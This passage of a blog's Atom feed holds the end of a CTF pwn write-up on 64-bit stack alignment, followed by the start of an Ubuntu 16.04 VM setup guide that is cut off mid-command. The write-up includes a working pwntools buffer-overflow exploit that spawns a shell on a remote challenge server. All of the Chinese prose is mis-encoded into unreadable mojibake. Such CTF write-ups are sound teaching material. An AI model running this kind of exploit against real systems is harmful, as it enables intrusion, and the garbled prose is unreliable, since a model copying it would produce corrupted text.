ˆå¹³è¡¡9.png"></p><p>gdb è‡ªåŠ¨æ–­åœ¨ <code>read()</code> å‡½æ•°ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A110.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡10.png"></p><p>ç»ˆç«¯ä¸­æŒ‰ä»»æ„é”®ç»§ç»­æ‰§è¡Œ python è„šæœ¬</p><p>gdb ç›´æ¥ finish è·³å‡º <code>read()</code> å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A111.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡11.png"></p><p>gdb ä¸€ç›´ ni å•æ­¥æ‰§è¡Œåˆ° <code>system()</code> å‡½æ•°çš„è°ƒç”¨å¤„</p><p>å‘ç°å‚æ•°æ˜¯ <code>&quot;/bin/sh&quot;</code> æ²¡æœ‰é—®é¢˜</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A16.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡6.png"></p><p>gdb ç»§ç»­ ni å•æ­¥æ‰§è¡Œ</p><p>å‘ç° gdb æŠ¥é”™ï¼š<code>Program received signal SIGSEGV, Segmentation fault.</code></p><p>ç¨‹åºæ–­åœ¨ï¼š<code>0x7ff1e1c50973 &lt;do_system+115&gt;    movaps xmmword ptr [rsp], xmm1</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A15.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡5.png"></p><p>è¯´æ˜è¿™ä¸€æ¡æŒ‡ä»¤å‡ºç°é—®é¢˜</p><p>gdb ç»§ç»­ ni å•æ­¥æ‰§è¡Œä¹Ÿä¸ä¼šå‘ç”Ÿä»»ä½•å˜åŒ–</p><p>è§‚å¯Ÿ RSP å¯„å­˜å™¨çš„å€¼ä¸º <code>0x7ffffb7aa188</code>ï¼Œ<strong>æ²¡æœ‰ 16 å­—èŠ‚å¯¹é½ï¼ˆæœ€ä½ 4 ä½ä¸æ˜¯ 0ï¼‰</strong></p><hr><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åœ¨è¿›å…¥ <code>system()</code> å‡½æ•°ä¹‹å‰ï¼Œå¢åŠ ä¸€ä¸ª <code>ret</code> æŒ‡ä»¤ï¼Œå› ä¸º <code>ret</code> æŒ‡ä»¤ä¸ä¼šæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµ</p><p>ä½¿ç”¨ ROPgadget æŸ¥æ‰¾ ret æŒ‡ä»¤åœ°å€ï¼š<code>ret_addr = 0x400431</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A13.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡3.png"></p><p>å°† payload æ”¹ä¸º <code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(ret_addr) + p64(callsystem_addr)</code> å³å¯æ‰“é€šæœ¬åœ°</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A14.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡4.png"></p><p>æ”¹è¿›åè„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># æ‰“å°è°ƒè¯•ä¿¡æ¯</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># æœ¬åœ°Pwné€šä¹‹åï¼Œå°†contentæ”¹æˆ0ï¼ŒPwnè¿œç¨‹ç«¯å£</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/æ¡Œé¢/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># ç¨‹åºåœ¨kaliçš„è·¯å¾„</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># é¢˜ç›®çš„è¿œç¨‹ç«¯å£</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/æ¡Œé¢/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># ç”Ÿæˆå¯¹è±¡elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># è·å–callsystemå‡½æ•°çš„åœ°å€ï¼Œæœ¬é¢˜ä¸º:0x0400596ï¼Œåœ¨idaä¸­å¯ä»¥çœ‹åˆ°å‡½æ•°çš„åœ°å€</span>ret_addr <span class="token operator">=</span> <span class="token number">0x400431</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># æ·»åŠ ä¸€ä¸ª p64(ret_addr) å¹³è¡¡å †æ ˆ</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å†æ¬¡è°ƒè¯•åˆ†æ"><a href="#å†æ¬¡è°ƒè¯•åˆ†æ" class="headerlink" title="å†æ¬¡è°ƒè¯•åˆ†æ"></a>å†æ¬¡è°ƒè¯•åˆ†æ</h2><p>åœ¨ <code>vulnerable_function()</code> æ‰§è¡Œå®Œåï¼Œä¼šå¤šæ‰§è¡Œä¸€ä¸ª <code>ret</code> æŒ‡ä»¤ï¼Œåœ°å€ä½äº <code>0x400431</code></p><p>ç„¶å ni å•æ­¥æ‰§è¡Œåˆ°è¾¾ <code>system()</code> å‡½æ•°</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A17.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡7.png"></p><p>ä½¿ç”¨ si è¿›å…¥ <code>system()</code> å‡½æ•°å†…éƒ¨</p><p>ni å•æ­¥æ‰§è¡Œåˆ° <code>movaps xmmword ptr [rsp], xmm1</code> è¯­å¥å¤„</p><p>å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥é€šè¿‡ ni å•æ­¥æ‰§è¡Œåˆ° <code>movaps xmmword ptr [rsp], xmm1</code> è¿™ä¸€å¥åé¢</p><p>å·²ç»ä¸ä¼šå†æŠ¥é”™äº†</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A18.png" alt="PWN-64ä½PWNç¨‹åºå †æ ˆå¹³è¡¡8.png"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶ RSP ä¸ºï¼š<code>0x7ffe95f29310</code>ï¼Œ<strong>å·²ç» 16 å­—èŠ‚å¯¹é½äº†ï¼ˆæœ€ä½ 4 ä½ä¸º 0ï¼‰</strong></p>]]></content>
    
    
    <summary type="html">åœ¨å­¦ä¹  PWN çš„æ ˆæº¢å‡ºæ¼æ´ ROP æ—¶é‡åˆ° ret2text ç±»é¢˜ç›®ï¼Œé€šè¿‡æ„é€  payload è¿›è¡Œ system è°ƒç”¨å°† &quot;/bin/sh&quot; ä½œä¸ºå‚æ•°æ¥è·å– shellï¼Œ32 ä½ä¸ 64 ä½é™¤äº†ä¼ å‚æ–¹å¼ä¸ä¸€æ ·ï¼Œæœ‰æ—¶ 64 ä½è¿˜éœ€è¦é¢å¤–åŠ ä¸Šä¸€ä¸ª ret åœ°å€æ¥ getshellï¼Œå¦åˆ™æ— æ³•æ‰“é€šï¼Œè¿™å°±æ˜¯å †æ ˆå¹³è¡¡å¼•èµ·çš„</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04è™šæ‹Ÿæœºç¯å¢ƒæ­å»º</title>
    <link href="https://www.uf4te.cn/posts/2b805828.html"/>
    <id>https://www.uf4te.cn/posts/2b805828.html</id>
    <published>2023-11-07T16:00:00.000Z</published>
    <updated>2024-06-05T06:35:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>å®‰è£…è½¯ä»¶æˆ– <code>git</code> ä»“åº“åˆ°æœ¬åœ°æ—¶ï¼Œå»ºè®®åœ¨è·¯å¾„ <code>/opt</code> ä¸‹å®‰è£…æˆ–å­˜æ”¾ï¼Œå…»æˆæ–‡ä»¶ç®¡ç†çš„ä¹ æƒ¯  </p><p>å¦å¤–ï¼Œapt å®‰è£…æ—¶å»ºè®®ä½¿ç”¨æ–°çš„ <code>sudo apt install xxx</code> ä»£æ›¿æ—§çš„ <code>sudo apt-get install xxx</code></p></blockquote><p>ä½¿ç”¨ pip å®‰è£…åº“æ—¶ï¼Œ<code>pip install xxx</code> å’Œ <code>sudo pip install xxx</code> å®‰è£…çš„åº“è·¯å¾„ä¸ä¸€æ ·ï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>sudo pip install xxx</code> å®‰è£…è·¯å¾„ï¼š<code>/usr/local/lib/python3.10/dist-packages/</code></li><li><code>pip install xxx</code> å®‰è£…è·¯å¾„ï¼š<code>/home/wyy/.local/lib/python3.10/site-packages/</code></li></ul><p><strong>å°½é‡ä¸è¦ä½¿ç”¨ <code>sudo pip install</code> æ¥å®‰è£… python åº“</strong></p><hr><p><mark>å¦‚æœæ­å»º Ubuntu 22.04 è¿™ç§æ–°ç‰ˆæœ¬çš„ç¯å¢ƒï¼Œè¯·ç§»æ­¥ï¼šã€Š<a href="Ubuntu22.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Ubuntu22.04è™šæ‹Ÿæœºç¯å¢ƒæ­å»º</a>ã€‹</mark></p><hr><p>ä»¥ä¸‹æ‰€æœ‰çš„å®‰è£…éƒ½åŸºäº Ubuntu 16.04 ï¼ˆéœ€è¦å‡çº§ pip å’Œ pythonï¼‰è™šæ‹Ÿæœºè¿›è¡Œäº†æµ‹è¯•ï¼Œå› ä¸ºè®¸å¤šåœ°æ–¹ä¸ Ubuntu 22.04 æœ‰æ‰€åŒºåˆ«ï¼Œæ‰€ä»¥å¦å†™äº†ä¸€ç¯‡ä¸“é—¨é’ˆå¯¹ Ubuntu 16.04 çš„é…ç½®</p><blockquote><p><strong>ä¸ç®— tips çš„å° tipsï¼š</strong></p><ol><li><em>VM è™šæ‹ŸæœºæŒ‚èµ·åå†ä¿å­˜å¿«ç…§å¯ä»¥ç§’å­˜ï¼Œä½†å¼€æœºè¿è¡ŒçŠ¶æ€ä¿å­˜å¿«ç…§ç›¸å½“æ…¢ï¼ˆå¼€æœºè¿è¡ŒçŠ¶æ€ä¿å­˜å¿«ç…§ä¸­é€”æ˜¯å¯ä»¥ç»§ç»­æ“ä½œè™šæ‹Ÿæœºçš„ï¼Œä¸å½±å¿«ç…§çš„ä¿å­˜ï¼‰</em></li><li>å¦‚æœå‘ç°åœ¨è™šæ‹Ÿæœºä¸­ï¼Œé¼ æ ‡çš„é¢å¤–åŠŸèƒ½é”®æ— æ³•ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šå‰è¿›ã€åé€€ç­‰<br>åœ¨è™šæ‹Ÿæœºæ–‡ä»¶å¤¹ä¸‹ï¼Œæœ‰ä¸€ä¸ªÂ <code>xxx.vmx</code>Â çš„æ–‡ä»¶ï¼Œ<u>åœ¨è™šæ‹Ÿæœºå…³é—­çš„æ¡ä»¶ä¸‹</u>ï¼Œä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œåœ¨æ–‡ä»¶çš„æœ€åæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œé‡æ–°å¼€å¯è™šæ‹Ÿæœºï¼Œå³å¯<em>ä½¿ç”¨é¼ æ ‡çš„é¢å¤–åŠŸèƒ½é”®</em>ï¼š<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mouse.vusb.enable <span class="token operator">=</span> <span class="token string">"TRUE"</span>  mouse.vusb.useBasicMouse <span class="token operator">=</span> <span class="token string">"FALSE"</span>  usb.generic.allowHID <span class="token operator">=</span> <span class="token string">"TRUE"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><em>Ubuntu 16.04 å°†å±å¹•å·¦ä¾§çš„å¯åŠ¨å™¨æ ç§»åŠ¨åˆ°å±å¹•åº•éƒ¨</em>ï¼Œåœ¨ç»ˆç«¯è¾“å…¥ï¼š<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Bottom<span class="token comment"># å¦‚æœæƒ³æ¢å›å·¦ä¾§ï¼Œè¾“å…¥ï¼š</span>gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>å¦‚æœ<em>å¼€æœºå‡ºç°æ˜¾ç¤ºå™¨ç›¸å…³æŠ¥é”™</em>ï¼šæ— æ³•åº”ç”¨åŸä¿å­˜çš„æ˜¾ç¤ºå™¨é…ç½®æˆ–è€… CRTC 63 ç›¸å…³é—®é¢˜<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> ~/.config/monitors.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>é‡å¯å³å¯è§£å†³</li></ol></blockquote><hr><h1 id="VMtools"><a href="#VMtools" class="headerlink" title="VMtools"></a>VMtools</h1><blockquote><p>åƒ Ubuntu16.04 è¿™ç§æ—§ç‰ˆæœ¬ä¸å»ºè®®ä½¿ç”¨ <code>Open VM Tools</code>ï¼ˆä¼šæŠ¥é”™ï¼‰ï¼Œè¿˜æ˜¯å»ºè®®ä½¿ç”¨ VMware å®˜æ–¹çš„ <code>VMware Tools</code></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å®‰è£…ï¼Œå°†VMtoolsè§£å‹åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œä¾‹å¦‚ä¸»ç›®å½•</span><span class="token builtin class-name">cd</span> ~/vmware-tools-distrib<span class="token function">sudo</span> ./vmware-install.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ›´æ¢é•œåƒæº"><a href="#æ›´æ¢é•œåƒæº" class="headerlink" title="æ›´æ¢é•œåƒæº"></a>æ›´æ¢é•œåƒæº</h1><blockquote><p>Linux è‡ªå¸¦çš„æºæ¥è‡ªå›½å¤–ï¼Œæœ‰æ—¶å€™ä¸‹è½½é€Ÿåº¦æ„Ÿäººï¼Œååˆ†éš¾å—ï¼Œå»ºè®®æ›´æ¢ç³»ç»Ÿçš„é•œåƒæº</p><p><mark>é’ˆå¯¹ Ubuntu 16.04 æˆ‘å»ºè®®ä½¿ç”¨é˜¿é‡Œæºï¼Œå› ä¸ºåé¢ pip æºä¹Ÿå»ºè®®ä½¿ç”¨é˜¿é‡Œæºï¼Œå¦åˆ™ pip ä¼šå‡ºç° SSL é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥å°†é•œåƒæºå’Œ pip æºç»Ÿä¸€ä¸€ä¸‹</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># è¿›å…¥aptç›®å½•ä¸‹</span><span class="token function">sudo</span> <span class="token function">cp</span> sources.list sources.list.backup <span class="token comment"># å¤‡ä»½</span><span class="token function">sudo</span> <span class="token function">vim</span> sources.list <span class="token comment"># ç¼–è¾‘sources.listæ–‡ä»¶</span><span class="token comment"># åŠ å…¥ä¸‹é¢ä¸¤ä¸ª----ä¹‹é—´çš„å†…å®¹</span>-----------------------------------------------------------------<span class="token comment"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span>deb-src http://archive.ubuntu.com/ubuntu xenial main restricted <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse <span class="token comment">#Added by software-properties</span>deb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse----------------------------------------------------------------- <span class="token comment"># åˆ·æ–°ä¸‰è¿</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Python-é…ç½®"><a href="#Python-é…ç½®" class="headerlink" title="Python é…ç½®"></a>Python é…ç½®</h1><blockquote><p>æ³¨æ„ï¼š<br>å¦‚æœè¦ç»™ Ubuntu 16.04 å®‰è£…æ–°ç‰ˆæœ¬çš„ Pythonï¼Œå°½é‡ä¸è¦æ›´æ”¹ç³»ç»Ÿé»˜è®¤çš„ <code>python3</code> æŒ‡å‘ï¼Œå› ä¸º Ubuntu çš„ä¸€äº›åŠŸèƒ½ä¾èµ–äº python 2.7 å’Œ python 3.5ï¼Œéšæ„æ”¹åŠ¨å¯èƒ½å‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„å…¼å®¹æ€§é—®é¢˜</p><p><strong>å¦å¤–ï¼Œç³»ç»Ÿè‡ªå¸¦çš„ python åƒä¸‡ä¸è¦å¸è½½ï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿå´©æºƒï¼ï¼ï¼</strong></p><p><em>Ubuntu 16.04 çš„ pip æºå»ºè®®ä½¿ç”¨é˜¿é‡Œæºï¼Œå¦åˆ™åé¢ä½¿ç”¨ pip å¯èƒ½ä¼šé‡åˆ° SSL é—®é¢˜</em></p></blockquote><p>Ubuntu 16.04 é»˜è®¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> æ— <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><mark>ä»¥ä¸Šé»˜è®¤è®¾ç½®å°½é‡ä¸è¦æ›´æ”¹</mark> <strong>ï¼ˆpython å’Œ pip çš„æŒ‡å‘å¯ä»¥ä¿®æ”¹ï¼Œä½† python2ã€python3 å°½é‡ä¸è¦åŠ¨ï¼‰</strong></p><p>å¦‚æœå®‰è£…äº†æ–°ç‰ˆçš„ Pythonï¼Œä¾‹å¦‚å®‰è£…äº† python 3.10.6ï¼Œå°±ä½¿ç”¨ <code>python3.10</code> æ¥æ‰“å¼€ï¼ŒåŒç†ä½¿ç”¨ <code>pip3.10</code></p><p>å³å¯¹åº”å…³ç³»ä¸ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>python3.10 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.10</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> æ— pip3.10 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">3.10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‡çº§ç³»ç»Ÿè‡ªå¸¦-pip"><a href="#å‡çº§ç³»ç»Ÿè‡ªå¸¦-pip" class="headerlink" title="å‡çº§ç³»ç»Ÿè‡ªå¸¦ pip"></a>å‡çº§ç³»ç»Ÿè‡ªå¸¦ pip</h2><blockquote><p>ç”±äºç³»ç»Ÿè‡ªå¸¦çš„ python çš„ pip ç‰ˆæœ¬å¤ªä½ ï¼ˆpip-8ï¼‰ï¼Œåç»­æ“ä½œä¼šå¯¼è‡´å„ç§é—®é¢˜ï¼Œæ‰€ä»¥æœ€å¥½å‡çº§ä¸€ä¸‹</p><p><mark>ä½†æ˜¯æ³¨æ„åƒä¸‡ä¸èƒ½ç›´æ¥ä½¿ç”¨ <code>pip3 install --upgrade pip</code> æ¥å‡çº§ç³»ç»Ÿè‡ªå¸¦çš„ pip</mark></p><p>å› ä¸ºè¿™ä¼šå°† pip å‡çº§ä¸ºæœ€æ–°ç‰ˆï¼Œå¯¼è‡´ä¸ python 3.5 ä¸åŒ¹é…ï¼Œå› ä¸º <strong>python 3.5 æœ€é«˜åªæ”¯æŒ pip-20.3.4</strong> ï¼ˆpython 3.5 åœ¨ 2020 å¹´ 9 æœˆåä¸å†æ”¯æŒ pip-21 ä»¥åçš„ç‰ˆæœ¬ï¼‰</p></blockquote><p>ä½¿ç”¨ <code>get-pip.py</code> æ›´æ–° python 3.5 è‡ªå¸¦çš„ pip ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py <span class="token parameter variable">-O</span> get-pip3.5.pypython3.5 get-pip3.5.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åŒç† python 2.7ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/2.7/get-pip.py <span class="token parameter variable">-O</span> get-pip2.7.pypython2.7 get-pip2.7.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœæ›´æ–° pip åä½¿ç”¨ <code>pip -V</code> å‡ºç°è­¦å‘Šï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: pip is being invoked by an old script wrapper. This will fail <span class="token keyword">in</span> a future version of pip.Please see https://github.com/pypa/pip/issues/5599 <span class="token keyword">for</span> advice on fixing the underlying issue.To avoid this problem you can invoke Python with <span class="token string">'-m pip'</span> instead of running pip directly.pip <span class="token number">20.3</span>.4 from /home/wyy/.local/lib/python3.5/site-packages/pip <span class="token punctuation">(</span>python <span class="token number">3.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è§£å†³åŠæ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ³¨æ„, PATH çš„å†…å®¹è¦ä¸ä¸Šè¿° WARNING ä¸­çš„è·¯å¾„ä¸€è‡´</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/home/wyy/.local/lib/python3.5/site-packages/pip:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="æ›´æ¢-pip-æº"><a href="#æ›´æ¢-pip-æº" class="headerlink" title="æ›´æ¢ pip æº"></a>æ›´æ¢ pip æº</h2><blockquote><p>Ubuntu 16.04 çš„ pip æºå»ºè®®ä½¿ç”¨é˜¿é‡Œæºï¼Œå¦åˆ™åé¢ä½¿ç”¨ pip å¯èƒ½ä¼šé‡åˆ° SSL é—®é¢˜</p></blockquote><p>å¦‚æœä½¿ç”¨ <code>pip install xxx</code> æ— æ³•å®‰è£…åº“ï¼Œå‡ºç°è­¦å‘Šï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">4</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">3</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token 